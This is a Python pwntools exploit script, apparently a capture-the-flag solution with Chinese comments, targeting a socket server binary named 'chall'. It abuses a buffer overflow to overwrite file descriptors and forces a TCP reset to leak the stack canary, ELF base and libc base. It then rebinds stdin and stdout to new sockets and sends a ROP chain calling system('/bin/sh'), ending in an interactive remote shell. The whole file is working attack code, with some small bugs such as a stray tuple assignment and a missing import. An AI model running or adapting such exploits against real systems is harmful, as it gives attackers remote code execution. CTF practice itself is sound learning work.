import argparse
import socket
import struct
import time
import sys
from pwn import *

parser = argparse.ArgumentParser(description="Sequential start_conion Exploit")
parser.add_argument(
  "mode",
  choices=["0", "1", "2", "t"],
  nargs="?",
  default="0",
  help="0=local, 1=local+gdb, 2=remote, t=direct process (default:0)",
)
args = parser.parse_args()

filename = "./chall"
libc_name = "./libc.so.6"
arch = "amd64"

def VIO_TEXT(x, code=95):
  return log.info(f"\x1b[{code}m{x}\x1b[0m")

def CLEAR_TEXT(x, code=32):
  return log.success(f"\x1b[{code}m{x}\x1b[0m")

def stop(msg="PAUSE", code=91):
    prompt = f"\n\x1b[1;{code}m{msg}\x1b[0m"
    try:
        return raw_input(prompt)
    except EOFError:
        print("") 
        pass

context(log_level="info", os="linux", arch=arch)
if args.mode == "1":
  context.terminal = ["tmux", "splitw", "-h"]

elf = ELF(filename, checksec=False)
if libc_name:
  libc = ELF(libc_name, checksec=False)

def start_con():
  if args.mode in ["0", "t"]:
    return remote("127.0.0.1", 31337)
  else:
    return remote("172.20.0.2", 5000)

def main():
  server_proc = None
  if args.mode in ["1"]:
    server_proc = process(filename)
    # gdb.attach(server_proc, gdbscript="""
    # set follow-fork-mode parent
    # c
    # """)
    time.sleep(1) # 等待服务端绑定端口
    server_proc.interactive()
    return

  ("--- Starting Sequential Exploit ---")

  # 1. 建立连接并制造竞态/溢出环境
  # [s1] fd=4: 发送长度头，然后挂起
  s1 = start_con()
  time.sleep(0.1)
 
  # [s2] fd=5: 准备覆盖
  s2 = start_con()
 
  VIO_TEXT("Sending size header to s1...")
  s1.send(p64(0x100))
  time.sleep(0.25) # 必须等待，确保 s1 的线程进入 read(fd, buf, size) 状态

  VIO_TEXT("Sending payload via s2...")
  s2.send(p64(0x100)) 
  # s2 发送 payload 覆盖s1的fd
  s2.send(b"\x00" * 0x7C + p32(4))
  time.sleep(0.5)
  # stop("send data from s2")

  # 由于socket的分配机制，这里实际分配到的仍然是供给s2的fd，但是不是4，作为缓冲
  s3 = start_con()
  time.sleep(0.1)
  # stop("get a new fd")
 
  # fd=4 被重用: 用来接收 Leak
  s4 = start_con()
  time.sleep(0.1)

  VIO_TEXT("Triggering leak via s4...")
  s4.send(p64(0x100))
  s4.send(b"\x00" * 0x7C + p32(1))
  time.sleep(0.25)

  # 2. 触发 RST 以激活漏洞/错误路径
  # 这里设置SOLSOCKET为SO_LINGER 并关闭 s1，会导致发送 RST 包
  # l_onoff = 1
  # l_linger = 0
  # 这里可以写struct.pack("ii", l_onoff, l_linger) 在64位机器上通常是 8 字节，符合 p32(1)+p32(0)
  s1.sock.setsockopt(
    socket.SOL_SOCKET, socket.SO_LINGER,p32(1)+p32(0) 
  )
  s1.sock.close()
  CLEAR_TEXT("s1 closed with RST")

  # 3. 接收并解析 Leak 数据
  # 服务端会将栈上0x100字节数据发送回来，其中包含了 Canary 和 libc 地址
  try:
    leak_data = s4.recv(0x100)
   
    # stop("fd 4-->1")
    if len(leak_data) < 0x90:
      log.error(f"Leak failed, received len: {len(leak_data)}")
      return

    canary = u64(leak_data[0x48:0x50])
    CLEAR_TEXT(f"Canary: {hex(canary)}")
   
    elf_base = u64(leak_data[0x58:0x60]) - 0x147e
    CLEAR_TEXT(f"ELF Base: {hex(elf_base)}")

    libc_base = u64(leak_data[0x88:0x90]) - 0x9c720 - 900
    CLEAR_TEXT(f"Libc Base: {hex(libc_base)}")
    libc.address = libc_base

  except EOFError:
    log.error("Unexpected EOF during leak")
    return

  # 4. Get Shell 
  # 通过覆盖实现 关闭 fd 0 和 1 
  s_temp = start_con()
  s_temp.send(p64(0x100))
  s_temp.send(b"\x00"*0x7c + p32(0))
  time.sleep(0.1)
  s_temp.close() # 保持连接

  s_temp2 = start_con()
  s_temp2.send(p64(0x100))
  s_temp2.send(b"\x00"*0x7c + p32(1))
  time.sleep(0.1)
  s_temp2.close()

  # 服务端重新accept了连接分配到了 fd=0, fd=1
  # 这样我们就能控制 stdin/stdout
  ret_addr=elf_base+0x101a,
  stdin_sock = start_con() 
  stdout_sock = start_con() 
 
  VIO_TEXT("Sending ROP chain...")
 
  payload = b"A" * 0x48
  payload += flat([
    canary,
    0xdeadbeef,
    libc.search(asm('pop rdi; ret')).__next__(), 
    libc.search(b"/bin/sh").__next__(),
    ret_addr,
    libc.sym['system']
  ])
  stdin_sock.send(p64(len(payload)))
  time.sleep(0.1)
  stdin_sock.send(payload)
 
  time.sleep(0.1)
  stdin_sock.sendline(b"ls")
  print(stdout_sock.recv(4096))
  def listner():
    while True:
        try:
            print("\n")
            data = stdout_sock.recv(4096)
            if data:
                sys.stdout.buffer.write(data)
                sys.stdout.flush()
        except exception:
            pass 
  t=threading.Thread(target=listner,daemon=True)
  t.start()
  while True:
    cmd = input("[nan0in27 sh]$ ")
    stdin_sock.sendline(cmd.encode())
  #   print(stdout_sock.recv().decode(errors='ignore'))

if __name__ == "__main__":
  main()

